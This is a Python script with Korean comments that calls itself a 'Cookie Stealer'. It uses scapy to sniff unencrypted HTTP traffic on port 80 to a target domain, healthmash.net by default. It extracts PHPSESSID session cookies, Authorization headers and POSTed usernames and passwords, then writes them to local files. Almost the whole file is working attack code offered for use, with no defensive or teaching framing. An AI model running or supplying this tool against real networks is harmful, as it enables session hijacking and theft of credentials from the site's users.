#!/usr/bin/env python3
"""
Network Sniffer - HTTP 트래픽에서 쿠키 탈취
Wireshark 없이 Python으로 패킷 캡처
"""

import sys
import re
from datetime import datetime

try:
    from scapy.all import *
    from scapy.layers.http import HTTPRequest, HTTPResponse
except ImportError:
    print("Error: scapy가 설치되지 않았습니다.")
    print("설치 명령: pip3 install scapy")
    sys.exit(1)

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

class CookieSniffer:
    def __init__(self, interface=None, target_domain="healthmash.net"):
        self.interface = interface
        self.target_domain = target_domain
        self.captured_cookies = []
        self.captured_sessions = []

    def packet_handler(self, packet):
        """패킷 분석 및 쿠키 추출"""

        if packet.haslayer(HTTPRequest):
            http_layer = packet[HTTPRequest]

            # Host 확인
            host = http_layer.Host.decode() if http_layer.Host else ""

            if self.target_domain in host:
                print(f"\n{Colors.CYAN}[*] HTTP Request 캡처{Colors.END}")
                print(f"    Host: {host}")
                print(f"    Path: {http_layer.Path.decode()}")
                print(f"    Method: {http_layer.Method.decode()}")

                # Cookie 헤더 확인
                if http_layer.Cookie:
                    cookie = http_layer.Cookie.decode()
                    print(f"{Colors.GREEN}    🍪 Cookie: {cookie}{Colors.END}")

                    # PHPSESSID 추출
                    session_match = re.search(r'PHPSESSID=([a-zA-Z0-9]+)', cookie)
                    if session_match:
                        session_id = session_match.group(1)

                        cookie_data = {
                            'timestamp': datetime.now().isoformat(),
                            'host': host,
                            'path': http_layer.Path.decode(),
                            'cookie': cookie,
                            'session_id': session_id,
                            'src_ip': packet[IP].src if packet.haslayer(IP) else 'Unknown',
                        }

                        self.captured_sessions.append(cookie_data)

                        print(f"{Colors.GREEN}    ✓ PHPSESSID: {session_id}{Colors.END}")
                        print(f"{Colors.GREEN}    ✓ Source IP: {cookie_data['src_ip']}{Colors.END}")

                        # 파일에 저장
                        with open('captured_cookies.txt', 'a') as f:
                            f.write(f"\n{'='*80}\n")
                            f.write(f"Time: {cookie_data['timestamp']}\n")
                            f.write(f"Host: {host}\n")
                            f.write(f"Path: {http_layer.Path.decode()}\n")
                            f.write(f"Source IP: {cookie_data['src_ip']}\n")
                            f.write(f"Cookie: {cookie}\n")
                            f.write(f"PHPSESSID: {session_id}\n")

                # Authorization 헤더 확인
                if http_layer.Authorization:
                    auth = http_layer.Authorization.decode()
                    print(f"{Colors.YELLOW}    🔑 Authorization: {auth}{Colors.END}")

                # POST 데이터 확인 (로그인 credential)
                if http_layer.Method == b'POST':
                    try:
                        load = packet[Raw].load.decode()
                        print(f"{Colors.YELLOW}    📝 POST Data: {load[:200]}{Colors.END}")

                        # 비밀번호 추출
                        username_match = re.search(r'username=([^&]+)', load)
                        password_match = re.search(r'password=([^&]+)', load)

                        if username_match and password_match:
                            print(f"{Colors.RED}    ⚠️  Credentials Captured!{Colors.END}")
                            print(f"{Colors.RED}       Username: {username_match.group(1)}{Colors.END}")
                            print(f"{Colors.RED}       Password: {password_match.group(1)}{Colors.END}")

                            with open('captured_credentials.txt', 'a') as f:
                                f.write(f"\n{'='*80}\n")
                                f.write(f"Time: {datetime.now().isoformat()}\n")
                                f.write(f"Username: {username_match.group(1)}\n")
                                f.write(f"Password: {password_match.group(1)}\n")
                    except:
                        pass

        elif packet.haslayer(HTTPResponse):
            http_layer = packet[HTTPResponse]

            # Set-Cookie 헤더 확인
            if http_layer.Set_Cookie:
                set_cookie = http_layer.Set_Cookie.decode()
                print(f"\n{Colors.PURPLE}[*] HTTP Response - Set-Cookie{Colors.END}")
                print(f"    {set_cookie}")

                # PHPSESSID 추출
                session_match = re.search(r'PHPSESSID=([a-zA-Z0-9]+)', set_cookie)
                if session_match:
                    session_id = session_match.group(1)
                    print(f"{Colors.GREEN}    ✓ New Session ID: {session_id}{Colors.END}")

    def start_sniffing(self):
        """패킷 캡처 시작"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}🔍 Network Sniffer - Cookie Stealer{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.END}\n")

        print(f"{Colors.BLUE}Target Domain: {self.target_domain}{Colors.END}")

        if self.interface:
            print(f"{Colors.BLUE}Interface: {self.interface}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}Interface: Auto (모든 인터페이스){Colors.END}")

        print(f"{Colors.YELLOW}Filter: HTTP traffic to {self.target_domain}{Colors.END}\n")

        print(f"{Colors.BOLD}패킷 캡처 시작... (Ctrl+C로 중지){Colors.END}\n")

        try:
            # HTTP 트래픽만 필터링 (포트 80)
            sniff(
                iface=self.interface,
                filter="tcp port 80",
                prn=self.packet_handler,
                store=False
            )
        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}[*] 캡처 중지됨{Colors.END}")
            self.print_summary()
        except Exception as e:
            print(f"\n{Colors.RED}Error: {e}{Colors.END}")
            print(f"{Colors.YELLOW}Hint: sudo 권한이 필요할 수 있습니다{Colors.END}")

    def print_summary(self):
        """캡처 요약"""
        print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
        print(f"{Colors.BOLD}📊 캡처 요약{Colors.END}")
        print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

        print(f"총 캡처된 세션: {len(self.captured_sessions)}개\n")

        if self.captured_sessions:
            print(f"{Colors.GREEN}캡처된 세션 ID:{Colors.END}\n")
            for session in self.captured_sessions:
                print(f"  {Colors.CYAN}Time:{Colors.END} {session['timestamp']}")
                print(f"  {Colors.CYAN}IP:{Colors.END} {session['src_ip']}")
                print(f"  {Colors.CYAN}PHPSESSID:{Colors.END} {session['session_id']}")
                print()

            print(f"{Colors.GREEN}✓ 쿠키 저장: captured_cookies.txt{Colors.END}\n")

        if os.path.exists('captured_credentials.txt'):
            print(f"{Colors.GREEN}✓ Credentials 저장: captured_credentials.txt{Colors.END}\n")

def main():
    import argparse

    parser = argparse.ArgumentParser(description='Network Cookie Sniffer')
    parser.add_argument('-i', '--interface', help='네트워크 인터페이스 (예: en0, eth0)')
    parser.add_argument('-d', '--domain', default='healthmash.net', help='타겟 도메인')
    args = parser.parse_args()

    sniffer = CookieSniffer(interface=args.interface, target_domain=args.domain)
    sniffer.start_sniffing()

if __name__ == '__main__':
    if os.geteuid() != 0:
        print(f"{Colors.YELLOW}⚠️  Warning: 이 스크립트는 sudo 권한이 필요할 수 있습니다{Colors.END}")
        print(f"{Colors.YELLOW}   사용법: sudo python3 network_sniffer.py{Colors.END}\n")

    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠ 종료됨{Colors.END}")
        sys.exit(0)
